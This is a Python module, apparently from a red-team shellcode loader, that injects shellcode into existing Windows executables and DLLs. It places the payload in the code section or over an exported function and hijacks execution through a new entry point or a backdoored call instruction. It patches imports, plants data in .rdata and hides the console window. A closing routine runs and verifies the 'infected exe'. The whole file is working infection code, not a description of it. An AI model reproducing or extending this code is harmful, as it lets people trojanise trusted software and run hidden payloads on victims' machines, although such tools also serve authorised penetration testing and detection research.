from helper import *
import logging
import time
import logging
from typing import Dict, List

from model.carrier import Carrier, DataReuseEntry, DataReuseReference
from pe.pehelper import *
from observer import observer
from pe.derbackdoorer import FunctionBackdoorer
from pe.superpe import SuperPe
from model.project import Project
from model.settings import Settings
from pe.asmdisasm import *
from model.defs import *
from model.payload import Payload

logger = logging.getLogger("Injector")


def inject_exe(carrier_shc: bytes, settings: Settings, carrier: Carrier, payload: Payload):
    exe_in = settings.inject_exe_in
    exe_out = settings.inject_exe_out
    carrier_invoke_style: CarrierInvokeStyle = settings.carrier_invoke_style

    logger.info("-[ Injecting: into {} -> {}".format(exe_in, exe_out))

    # CHECK if shellcode fits into the target code section
    carrier_shc_len = len(carrier_shc)
    #code_sect_size = carrier.superpe.get_code_section().Misc_VirtualSize
    #if carrier_shc_len + CODE_INJECT_SIZE_CHECK_ADD > code_sect_size:
    #    raise Exception("Error: Shellcode size {}+{} too big for target code section {}".format(
    #        carrier_shc_len, CODE_INJECT_SIZE_CHECK_ADD, code_sect_size
    #    ))

    # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
    superpe = SuperPe(exe_in)
    function_backdoorer = FunctionBackdoorer(superpe)

    # Patch IAT (if necessary and wanted)
    for iatRequest in carrier.get_all_iat_requests():
        # skip available
        addr = superpe.get_vaddr_of_iatentry(iatRequest.name)
        if addr != None:
            logger.info("---[ Request IAT {} is available at 0x{:X}".format(
                iatRequest.name, addr))
            continue
        iat_name = superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)

        if not settings.fix_missing_iat:
            raise Exception("Error: {} not available, but fix_missing_iat is False".format(
                iatRequest.name))
        # do the patch
        superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
        #logger.info("    Unavailable IAT {} now patched".format(
        #        iatRequest.name))
    # we modify the IAT raw, so reparsing is required
    superpe.pe.parse_data_directories()
    superpe.init_iat_entries()

    carrier_shc_offset: int = 0  # file offset

    # Special case: DLL exported function direct overwrite
    if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
        logger.warning("---[ Inject DLL: Overwrite exported function {} with shellcode".format(settings.dllfunc))
        rva = superpe.getExportEntryPoint(settings.dllfunc)

        # Size and sanity checks
        function_size = superpe.get_size_of_exported_function(settings.dllfunc)
        if carrier_shc_len >= function_size:
            logger.warning("Shellcode larger than function: {} > {} exported function {}".format(
                carrier_shc_len, function_size, settings.dllfunc
            ))

        # Inject
        carrier_shc_offset = superpe.get_offset_from_rva(rva)
        logger.info(f'----[ Using DLL Export "{settings.dllfunc}" at RVA 0x{rva:X} offset 0x{carrier_shc_offset:X} to overwrite')
        superpe.pe.set_bytes_at_offset(carrier_shc_offset, carrier_shc)

    else:  # EXE/DLL
        # Put it somewhere in the code section, and rewire the flow
        code_section = superpe.get_code_section()
        if code_section == None:
            raise Exception('Could not find code section in input PE file!')
        sect_size = code_section.Misc_VirtualSize  # Better than: SizeOfRawData
        if sect_size < carrier_shc_len + CODE_INJECT_SIZE_CHECK_ADD:
            raise Exception("Shellcode too large: {}+{} > {}".format(
                carrier_shc_len, CODE_INJECT_SIZE_CHECK_ADD, sect_size
            ))
        carrier_shc_offset = int((sect_size - carrier_shc_len) / 2)  # centered in the .text section
        #shellcode_offset = round_up_to_multiple_of_8(shellcode_offset)
        carrier_shc_offset += code_section.PointerToRawData
        shellcode_rva = superpe.pe.get_rva_from_offset(carrier_shc_offset)

        # Aligning the payload (not carrier!) to page size is important for dll_loader_change
        if settings.carrier_name == "dll_loader_change":
            # align shellcode_rva minus an offset to page size
            shellcode_rva = align_to_page_size(shellcode_rva, carrier_shc_len - len(payload.payload_data))
            carrier_shc_offset = superpe.pe.get_offset_from_rva(shellcode_rva)

        logger.info("--[ Inject: Write Carrier to 0x{:X} (0x{:X})".format(
            shellcode_rva, carrier_shc_offset))

        # Copy the shellcode
        superpe.pe.set_bytes_at_offset(carrier_shc_offset, carrier_shc)

        # rewire flow
        if superpe.is_dll() and settings.dllfunc != "":  # DLL
            if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
                # Handled above
                raise Exception("We should not land here")

            elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                addr = superpe.getExportEntryPoint(settings.dllfunc)
                logger.info("---( Inject DLL: Backdoor {} (0x{:X})".format(
                    settings.dllfunc, addr))
                function_backdoorer.backdoor_function(addr, shellcode_rva, carrier_shc_len)

        else: # EXE
            if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
                logger.info("---( Inject EXE: Change Entry Point to 0x{:X}".format(
                    shellcode_rva))
                superpe.set_entrypoint(shellcode_rva)

            elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                addr = superpe.get_entrypoint()
                logger.info("---( Inject EXE: Backdoor function at entrypoint (0x{:X})".format(
                    addr))
                function_backdoorer.backdoor_function(addr, shellcode_rva, carrier_shc_len)

    logger.info("--( Fix imports and make carrier reference IAT")
    injected_fix_iat(superpe, carrier)
    logger.info("--( Insert and reference carrier data")
    injected_fix_data(superpe, carrier, 
                      carrier_shc_offset + carrier_shc_len + 4096)

    # changes from console to UI (no console window) if necessary
    superpe.patch_subsystem()

    # We done
    logger.info("--( Write to file: {}".format(exe_out))
    superpe.write_pe_to_file(exe_out)

    # Log
    code = file_readall_binary(exe_out)
    in_code = code[carrier_shc_offset:carrier_shc_offset+carrier_shc_len]
    observer.add_code_file("carrier_exe", in_code)


def injected_fix_iat(superpe: SuperPe, carrier: Carrier):
    """replace IAT-placeholders in shellcode with call's to the IAT"""
    code = superpe.get_code_section_data()
    for iatRequest in carrier.get_all_iat_requests():
        for placeholder in iatRequest.references:
            if not placeholder in code:
                raise Exception("IatResolve ID {} not found, abort".format(placeholder))
            offset_from_code = code.index(placeholder)
            
            # Note that the SuperPe may already have been patched for new IAT imports
            destination_virtual_address = superpe.get_vaddr_of_iatentry(iatRequest.name)
            if destination_virtual_address == None:
                raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
            
            instruction_virtual_address = offset_from_code + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
            logger.info("      Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X} ({})".format(
                placeholder.hex(), 
                instruction_virtual_address,
                destination_virtual_address,
                iatRequest.name
            ))
            jmp = assemble_relative_call(instruction_virtual_address, destination_virtual_address)
            if len(jmp) != len(placeholder):
                raise Exception("IatResolve: Call to IAT has different length than placeholder: {} != {} abort".format(
                    len(jmp), len(placeholder)
                ))
            code = code.replace(placeholder, jmp)

    superpe.write_code_section_data(code)


def injected_fix_data(superpe: SuperPe, carrier: Carrier, shellcode_offset: int):
    """Inject data into .rdata/.text and replace reusedata_fixup placeholders in code with LEA"""
    reusedata_fixups: List[DataReuseEntry] = carrier.get_all_reusedata_fixups()
    if len(reusedata_fixups) == 0:
        # nothing todo
        return
    
    # .rdata storage manager
    rdata_section = carrier.superpe.get_section_by_name(".rdata")
    if rdata_section == None:
        raise Exception("No .rdata section found, abort")
    rm = carrier.superpe.get_rdata_relocmanager()

    # insert data
    logger.info("---( DataReuseFixups: Inject the data")
    for datareuse_fixup in reusedata_fixups:
        logger.debug("     Handling DataReuse Fixup: {} (.code: {})".format(
            datareuse_fixup.string_ref, datareuse_fixup.in_code))

        if datareuse_fixup.in_code:  # .text
            superpe.pe.set_bytes_at_offset(shellcode_offset, datareuse_fixup.data)
            payload_rva = superpe.pe.get_rva_from_offset(shellcode_offset)
            datareuse_fixup.addr = payload_rva + carrier.superpe.get_image_base()
            logging.info("       Add to .text at 0x{:X} ({}): {} with size {}".format(
                datareuse_fixup.addr, payload_rva, datareuse_fixup.string_ref, len(datareuse_fixup.data)))

        else:  # .rdata
            # get a hole in the .rdata section to put our data
            hole_rva = rm.find_hole(len(datareuse_fixup.data))
            if hole_rva == None:
                raise Exception("No suitable hole with size {} found in .rdata section, abort".format(
                    len(datareuse_fixup.data)
                ))
            rm.add_range(hole_rva[0], hole_rva[1]+1)  # mark it as used

            var_data = datareuse_fixup.data
            data_rva = hole_rva[0]
            superpe.pe.set_bytes_at_rva(data_rva, var_data)
            datareuse_fixup.addr = data_rva + carrier.superpe.get_image_base()
            logging.info("       Add to .rdata at 0x{:X} ({}): {}: {}".format(
                datareuse_fixup.addr, data_rva, datareuse_fixup.string_ref, ui_string_decode(var_data)))

    # replace the placeholder in .text with a LEA instruction to the data we written above
    logger.info("---( Datareusefixups: patch code to reference the data")
    code = superpe.get_code_section_data()
    for datareuse_fixup in reusedata_fixups:
        ref: DataReuseReference
        for ref in datareuse_fixup.references:
            if not ref.placeholder in code:
                raise Exception("fix data in injectable: DataReuse: ID {} ({}) not found in code section, abort".format(
                    ref.placeholder.hex(), datareuse_fixup.string_ref))
            
            offset_from_datasection = code.index(ref.placeholder)
            instruction_virtual_address = offset_from_datasection + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
            destination_virtual_address = datareuse_fixup.addr
            logger.info("       Replace bytes {} at VA 0x{:X} with: LEA {} .rdata 0x{:X}".format(
                ref.placeholder.hex(), instruction_virtual_address, ref.register, destination_virtual_address
            ))
            lea = assemble_lea(
                instruction_virtual_address, destination_virtual_address, ref.register
            )
            asm_disasm(lea, instruction_virtual_address)  # DEBUG
            if len(lea) != len(ref.placeholder):
                raise Exception("DataReuseFixup: lea instr has different length than placeholder: {} != {} abort".format(
                    len(lea), len(ref.placeholder)
                ))
            code = code.replace(ref.placeholder, lea)

    superpe.write_code_section_data(code)


def verify_injected_exe(exefile: FilePath, dllfunc="") -> int:
    logger.info("---[ Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_exe(exefile, dllfunc=dllfunc, check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(VerifyFilename)
        return 0
    else:
        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
        return 1


